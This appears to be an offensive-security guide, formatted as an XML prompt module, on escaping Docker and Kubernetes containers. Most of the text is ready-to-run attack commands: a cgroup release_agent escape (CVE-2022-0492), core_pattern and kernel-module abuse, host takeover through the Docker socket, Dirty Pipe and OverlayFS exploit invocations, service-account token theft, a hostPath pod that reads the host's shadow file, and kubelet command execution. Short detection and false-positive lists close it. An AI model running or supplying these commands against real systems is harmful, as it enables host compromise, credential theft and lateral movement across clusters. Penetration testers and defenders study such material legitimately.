<vulnerability_guide>
  <title>ADVANCED CONTAINER BREAKOUT AND ESCAPE TECHNIQUES</title>

  <critical>Container breakout allows attackers to escape container isolation and access the host system or other containers. While containers provide process isolation, misconfigurations, kernel vulnerabilities, and excessive privileges create escape paths. Container escape typically leads to full node compromise in Kubernetes environments and lateral movement across the infrastructure.</critical>

  <scope>
    - Privileged container escape
    - Capability abuse (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc.)
    - Kernel vulnerability exploitation
    - Mount namespace escapes
    - Container runtime vulnerabilities
    - Kubernetes-specific breakouts
    - Shared resource exploitation
  </scope>

  <methodology>
    1. **Enumerate container context**: Identify runtime, privileges, and capabilities
    2. **Check mounted resources**: Find sensitive host paths and sockets
    3. **Identify misconfigurations**: Look for privileged mode and dangerous capabilities
    4. **Test kernel exploits**: If kernel is vulnerable, attempt escape
    5. **Exploit runtime**: Target container runtime vulnerabilities
    6. **Pivot**: Move to host or other containers
  </methodology>

  <advanced_techniques>
    <container_enumeration>
      Identify container environment:
      {% raw %}
      # Detect containerization
      cat /proc/1/cgroup | grep -E "docker|kubepods|containerd"
      ls -la /.dockerenv
      cat /proc/self/mountinfo | grep -E "overlay|aufs"

      # Check container runtime
      cat /proc/1/cmdline
      ls /run/containerd/containerd.sock
      ls /var/run/docker.sock

      # Enumerate capabilities
      cat /proc/self/status | grep Cap
      capsh --print

      # Check security context
      cat /proc/self/attr/current  # SELinux
      cat /proc/self/attr/apparmor/current  # AppArmor

      # Check privileged mode
      cat /proc/self/status | grep -i seccomp
      # Seccomp: 0 = privileged, 2 = filtered

      # Enumerate mounts
      cat /proc/mounts
      mount | grep -E "docker|kube|host"
      {% endraw %}
    </container_enumeration>

    <privileged_container_escape>
      Escape from privileged containers:
      {% raw %}
      # Method 1: Mount host filesystem
      mkdir /mnt/host
      mount /dev/sda1 /mnt/host
      chroot /mnt/host /bin/bash

      # Method 2: Access host via /proc
      # If /proc/sys/kernel/core_pattern is writable
      echo '|/path/to/malicious/script' > /proc/sys/kernel/core_pattern
      # Trigger core dump to execute on host

      # Method 3: Load kernel module
      insmod /path/to/malicious.ko

      # Method 4: Cgroup escape (CVE-2022-0492)
      mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
      mkdir /tmp/cgrp/x
      echo 1 > /tmp/cgrp/x/notify_on_release
      host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
      echo "$host_path/cmd" > /tmp/cgrp/release_agent
      echo '#!/bin/sh' > /cmd
      echo "cat /etc/shadow > /output" >> /cmd
      chmod +x /cmd
      sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

      # Method 5: Abuse host PID namespace
      # If --pid=host
      nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
      {% endraw %}
    </privileged_container_escape>

    <capability_abuse>
      Exploit dangerous capabilities:
      {% raw %}
      # CAP_SYS_ADMIN - Most dangerous
      # Can mount filesystems, access /dev, modify namespace
      mount -t proc proc /mnt
      mount --bind /etc/shadow /mnt/shadow

      # CAP_SYS_PTRACE - Debug processes
      # Attach to host processes if PID namespace shared
      strace -p 1
      gdb -p $(pgrep sshd)

      # CAP_NET_ADMIN - Network manipulation
      # ARP spoofing, traffic interception
      ip link add dummy0 type dummy
      iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

      # CAP_DAC_READ_SEARCH - Bypass file read permission
      # Read any file regardless of permissions
      cat /etc/shadow  # Works even without read permission

      # CAP_SYS_MODULE - Load kernel modules
      # Load malicious kernel module
      insmod rootkit.ko

      # CAP_NET_RAW - Raw socket access
      # Network sniffing and packet injection
      tcpdump -i eth0
      {% endraw %}
    </capability_abuse>

    <docker_socket_escape>
      Escape via exposed Docker socket:
      {% raw %}
      # Check for Docker socket
      ls -la /var/run/docker.sock

      # Method 1: Create privileged container
      docker run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i bash

      # Method 2: Mount host root
      docker run -it -v /:/host ubuntu chroot /host /bin/bash

      # Method 3: Using curl (no docker client)
      curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

      # Create container with host mount
      curl -s -X POST --unix-socket /var/run/docker.sock \
        -H "Content-Type: application/json" \
        -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}' \
        http://localhost/containers/create

      # Start and exec into container
      curl -s -X POST --unix-socket /var/run/docker.sock \
        http://localhost/containers/[ID]/start
      {% endraw %}
    </docker_socket_escape>

    <kernel_exploits>
      Exploit kernel vulnerabilities:
      {% raw %}
      # Dirty COW (CVE-2016-5195)
      # Affects kernels < 4.8.3
      gcc -pthread dirty.c -o dirty -lcrypt
      ./dirty password

      # Dirty Pipe (CVE-2022-0847)
      # Affects kernels 5.8 - 5.16.11
      ./exploit /etc/passwd 1 $'root:$1$attacker:0:0:root:/root:/bin/bash\n'

      # OverlayFS (CVE-2021-3493)
      # Ubuntu kernel privilege escalation
      unshare -rm sh -c "mkdir l u w m && cp /u*/telegramme l/ && setcap cap_setuid+eip l/telegramme && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/* && u/telegramme"

      # Netfilter (CVE-2022-25636)
      # Kernel heap overflow
      ./exploit_nf

      # Check kernel version
      uname -r
      cat /proc/version

      # Search for exploits
      searchsploit linux kernel 5.x
      {% endraw %}
    </kernel_exploits>

    <kubernetes_specific_escapes>
      Kubernetes-specific breakout techniques:
      {% raw %}
      # Service account token abuse
      cat /var/run/secrets/kubernetes.io/serviceaccount/token
      KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

      curl -k -H "Authorization: Bearer $KUBE_TOKEN" \
        https://kubernetes.default.svc/api/v1/namespaces/default/pods

      # If SA has cluster-admin or can create pods:
      # Create pod with hostPath mount
      kubectl run pwned --image=alpine --overrides='
      {
        "spec": {
          "containers": [{
            "name": "pwned",
            "image": "alpine",
            "command": ["/bin/sh", "-c", "cat /host/etc/shadow"],
            "volumeMounts": [{
              "name": "host",
              "mountPath": "/host"
            }]
          }],
          "volumes": [{
            "name": "host",
            "hostPath": {"path": "/", "type": "Directory"}
          }]
        }
      }'

      # Node API access
      curl -k https://$(hostname):10250/pods
      curl -k https://$(hostname):10250/run/default/pod/container -d "cmd=id"

      # etcd access (if exposed)
      ETCDCTL_API=3 etcdctl get / --prefix --keys-only
      {% endraw %}
    </kubernetes_specific_escapes>

    <shared_resource_exploitation>
      Exploit shared namespaces and resources:
      {% raw %}
      # Shared PID namespace
      ps aux  # Can see host processes
      kill -9 1  # Can kill init
      cat /proc/1/environ  # Read host process environment

      # Shared network namespace
      # Container can see host network traffic
      tcpdump -i any
      ss -tlnp  # See all listening services

      # Shared IPC namespace
      ipcs  # List shared memory segments
      # Can communicate with host processes

      # /proc exploitation
      cat /proc/1/root/etc/shadow  # Access host files via PID 1

      # Host path mounts
      # If any host path is mounted:
      find / -type f -name "*.key" 2>/dev/null
      cat /host-path/etc/shadow
      {% endraw %}
    </shared_resource_exploitation>
  </advanced_techniques>

  <validation>
    - Successfully access host filesystem from container
    - Execute commands on host system
    - Read sensitive host files (shadow, credentials)
    - Escape container using specific technique (socket, capabilities, kernel)
    - Demonstrate pivot to other containers or nodes
  </validation>

  <false_positives>
    - Intentionally privileged containers (monitoring, security tools)
    - Host path mounts with read-only access
    - Containers in their own PID/network namespace (isolated)
    - Containers with seccomp profiles blocking escape
  </false_positives>

  <detection_indicators>
    - Mount operations from within containers
    - Docker socket access from unexpected containers
    - Kernel module loading attempts
    - Process injection across namespaces
    - Access to /proc/1 or host PIDs
  </detection_indicators>

  <pro_tips>
    - Docker socket mount is the most common escape vector
    - Privileged containers can do almost anything on the host
    - Check for any capability beyond the default minimal set
    - /proc and /sys mounts can leak host information
    - Kubernetes service account tokens may have excessive permissions
    - Container runtime vulnerabilities periodically discovered - check versions
    - Seccomp and AppArmor profiles significantly reduce attack surface
    - HostPID and hostNetwork are dangerous but sometimes necessary
  </pro_tips>

  <remember>Container isolation is only as strong as its configuration. A single privileged container, mounted socket, or dangerous capability can compromise the entire host and all containers running on it.</remember>
</vulnerability_guide>
